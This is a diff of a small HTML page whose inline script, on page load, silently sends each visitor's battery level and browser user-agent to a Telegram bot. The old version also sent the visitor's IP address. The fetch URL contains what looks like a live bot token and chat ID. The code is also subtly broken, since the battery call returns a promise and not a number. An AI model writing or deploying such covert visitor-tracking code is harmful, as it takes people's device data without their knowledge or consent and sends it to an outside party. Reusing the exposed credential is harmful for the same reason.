@@ -32,11 +32,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>User Information</title>
+    <title>Get Battery Level and Mobile Type</title>
 </head>
 <body>
     <script>
-        fetch('https://api.telegram.org/bot6775743336:AAEEGbU3650cCjErIhQUc7cmpFNQMDxGJ_k/sendMessage?chat_id=1776168152&text=Battery Level: ' + navigator.getBattery().level + '% Mobile Type: ' + navigator.userAgent + ' IP Address: ' + returnCitySN.cip)
+        fetch('https://api.telegram.org/bot6775743336:AAEEGbU3650cCjErIhQUc7cmpFNQMDxGJ_k/sendMessage?chat_id=1776168152&text=Battery Level: ' + navigator.getBattery().level + '% Mobile Type: ' + navigator.userAgent)
     </script>
 </body>
 </html>
